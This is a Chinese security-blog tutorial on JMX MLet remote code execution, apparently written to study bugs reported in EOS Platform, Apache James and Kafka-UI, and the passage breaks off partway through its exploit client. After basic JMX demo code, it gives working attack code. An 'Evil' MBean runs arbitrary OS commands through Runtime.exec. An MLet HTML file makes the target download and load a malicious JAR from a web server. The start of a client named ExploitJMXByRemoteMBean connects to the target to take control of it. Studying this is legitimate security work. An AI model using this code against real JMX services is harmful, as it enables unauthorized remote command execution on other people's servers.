---
title: JMX 反序列化漏洞
url: https://www.secpulse.com/archives/205242.html
source: 安全脉搏
date: 2025-01-15
fetch_date: 2025-10-06T20:09:16.055023
---

# JMX 反序列化漏洞

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# JMX 反序列化漏洞

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2025-01-14

13,408

## 前言

前段时间看到普元 EOS Platform 爆了这个洞，Apache James，Kafka-UI 都爆了这几个洞，所以决定系统来学习一下这个漏洞点。

## JMX 基础

### JMX 前置知识

JMX（Java Management Extensions，即 Java 管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX 可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用。

可以简单理解 JMX 是 java 的一套管理框架，coders 都遵循这个框架，实现对代码应用的监控与管理。

![JMXStructure](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407181425046.png)

JMX 的结构一共分为三层：

1、基础层：主要是 MBean，被管理的资源。分为四种，常用需要关注的是两种。

* standard MBean 这种类型的 MBean 最简单，它能管理的资源（包括属性、方法、时间）必须定义在接口中，然后 MBean 必须实现这个接口。它的命令也必须遵循一定的规范，例如我们的 MBean 为 Hello，则接口必须为 HelloMBean。
* dynamic MBean 必须实现 javax.management.DynamicMBean 接口，所有的属性，方法都在运行时定义。2、适配层：MBeanServer，主要是提供对资源的注册和管理。3、接入层：Connector，提供远程访问的入口。

### JMX 基础代码实践

以下代码实现简单的 JMX demo，文件结构

```
├── HelloWorld.java
├── HelloWorldMBean.java
└── jmxDemo.java
```

**HelloWorldMBean.java**

```
package org.example;

public interface HelloWorldMBean {
    public void sayhello();
    public int add(int x, int y);
    public String getName();
}
```

**HelloWorld.java**

```
package org.example;

public class HelloWorld implements HelloWorldMBean{
    private String name = "Drunkbaby";
    @Override
    public void sayhello() {
        System.out.println("hello world" + this.name);
    }

    @Override
    public int add(int x, int y) {
        return x + y;
    }

    @Override
    public String getName() {
        return this.name;
    }
}
```

**jmxDemo.java**

```
package org.example;

import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.management.remote.JMXConnectorServer;
import javax.management.remote.JMXConnectorServerFactory;
import javax.management.remote.JMXServiceURL;
import java.lang.management.ManagementFactory;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class jmxDemo {
    public static void main(String[] args) throws Exception{
        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
        ObjectName mbsName = new ObjectName("test:type=HelloWorld");
        HelloWorld mbean = new HelloWorld();
        mBeanServer.registerMBean(mbean, mbsName);

        // 创建一个 RMI Registry
        Registry registry = LocateRegistry.createRegistry(1099);
        // 构造 JMXServiceURL，绑定创建的 RMI
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi");
        // 构造JMXConnectorServer，关联 mbserver
        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
        jmxConnectorServer.start();
        System.out.println("JMXConnectorServer is ready");

        System.out.println("press any key to exit.");
        System.in.read();

    }
}
```

其中

* Probe Level：创建了 HelloWorldMBean 实例 mbean
* Agent Level：创建了 MBeanServer 实例 mbs
* Remote Management Level: 创建了JMXServiceURL，绑定到本地 1099 rmi，关联到MBeanServer mbs

## JMX 安全问题

JMX 的安全问题主要发生在以下三处

1、jmx2、mbean3、rmi

其中通过利用 MLet 是最常用的攻击手法，算是 jmx 特性 + mbean 利用，接下来我们详细来看看 Mlet 的漏洞利用及原理。

### Mlet

> Mlet 指的是 `javax.management.loading.MLet`，该 mbean 有个 getMBeansFromURL 的方法，可以从远程 mlet server 加载 mbean。

攻击过程：

1. 启动托管 MLet 和含有恶意 MBean 的 JAR 文件的 Web 服务器
2. 使用JMX在目标服务器上创建 `MBeanjavax.management.loading.MLet` 的实例
3. 调用 MBean 实例的 getMBeansFromURL 方法，将 Web 服务器 URL 作为参数进行传递。JMX 服务将连接到http服务器并解析MLet文件
4. JMX 服务下载并归档 MLet 文件中引用的 JAR 文件，使恶意 MBean 可通过 JMX 获取
5. 攻击者最终调用来自恶意 MBean 的方法

* 下面我们来编写一个漏洞实例。

#### Evil MBean

文件结构

```
├── Evil.java
└── EvilMBean.java
```

**EvilMBean.java**

```
package com.drunkbaby.mlet;

public interface EvilMBean {
    public String runCommand(String cmd);
}
```

**Evil.java**

```
package com.drunkbaby.mlet;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Evil implements EvilMBean
{
    public String runCommand(String cmd)
    {
        try {
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec(cmd);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            String stdout_err_data = "";
            String s;
            while ((s = stdInput.readLine()) != null)
            {
                stdout_err_data += s+"\n";
            }
            while ((s = stdError.readLine()) != null)
            {
                stdout_err_data += s+"\n";
            }
            proc.waitFor();
            return stdout_err_data;
        }
        catch (Exception e)
        {
            return e.toString();
        }
    }
}
```

#### Mlet Server

将原本的文件打包为 jar 包。步骤省略了，就是 build Artifacts。随后编写 evil.html

```
<html><mlet code="com.drunkbaby.mlet.Evil" archive="JMX.jar" name="MLetCompromise:name=evil,id=1" codebase="http://127.0.0.1:4141"></mlet></html>
```

整体结构如图

![JMXJar.png](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202407181426985.png)

#### Attack Code

**ExploitJMXByRemoteMBean.java**

```
package com.drunkbaby.mlet;

import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import java.net.MalformedURLException;
import java.util.HashSet;
import java.util.Iterator;

public class ExploitJMXByRemoteMBean {

    public static void main(String[] args) {
        try {
//            connectAndOwn(args[0], args[1], args[2]);
            connectAndOwn("localhost","...